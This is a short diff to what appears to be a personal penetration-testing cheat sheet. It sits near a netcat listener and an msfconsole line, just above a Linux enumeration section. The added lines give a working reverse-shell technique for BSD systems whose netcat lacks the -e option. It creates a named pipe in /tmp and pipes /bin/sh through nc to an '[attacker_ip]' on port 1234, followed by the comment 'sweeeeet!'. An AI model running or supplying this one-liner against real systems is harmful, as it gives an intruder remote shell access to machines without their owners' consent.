@@ -150,6 +150,13 @@ nc -v -n -l -p 1234
 ### an msf listener
 msfconsole
 
+#what do you do if its BSD and doesn't have -e as an option!?
+
+mknod /tmp/backpipe p 
+/bin/sh 0</tmp/backpipe | nc [attacker_ip] 1234 1>/tmp/backpipe
+
+#sweeeeet!
+
 
 ###################LINUX ENUMERATION#################################
 #ok so ideally use a tool such as linenum.sh however we need to know what to do manualy.
